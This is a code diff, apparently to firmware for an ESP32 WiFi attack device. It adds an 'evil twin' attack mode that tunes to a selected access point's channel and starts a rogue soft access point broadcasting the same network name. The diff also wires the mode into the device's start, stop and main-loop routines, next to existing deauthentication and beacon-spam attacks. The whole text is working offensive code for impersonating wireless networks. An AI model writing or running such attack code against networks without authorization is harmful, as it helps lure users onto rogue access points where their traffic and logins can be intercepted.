@@ -302,6 +302,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     this->startWiFiAttacks(scan_mode, color, text_table1[51]);
   else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
     this->startWiFiAttacks(scan_mode, color, text_table1[52]);
+  else if (scan_mode == WIFI_ATTACK_EVIL_TWIN)
+    this->startWiFiAttacks(scan_mode, color, text_table1[59]);
   else if (scan_mode == WIFI_ATTACK_AUTH)
     this->startWiFiAttacks(scan_mode, color, text_table4[7]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH)
@@ -432,6 +434,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
   (currentScanMode == WIFI_ATTACK_AUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
+  (currentScanMode == WIFI_ATTACK_EVIL_TWIN) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
@@ -2443,6 +2446,17 @@ void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
   }
 }
 
+void WiFiScan::sendEvilTwinAttack(uint32_t currentTime, String ap_ssid) {
+  for (int i = 0; i < access_points->size(); i++) {
+    if (access_points->get(i).selected) {
+      this->set_channel = access_points->get(i).channel;
+      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
+        WiFi.mode(WIFI_AP);
+        WiFi.softAP(access_points->get(i).essid.c_str());
+        break;
+}
+    }
+  }
 
 void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
@@ -3218,6 +3232,14 @@ void WiFiScan::main(uint32_t currentTime)
       #endif
       packets_sent = 0;
     }
+  }
+  else if (currentScanMode == WIFI_ATTACK_EVIL_TWIN) {
+      int i = 0;
+      for (i = 0; i < access_points->size(); i++) {
+        if (access_points->get(i).selected) 
+        break;
+      }
+      this->sendEvilTwinAttack(currentTime, access_points->get(i).essid);
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
     for (int i = 0; i < 55; i++)
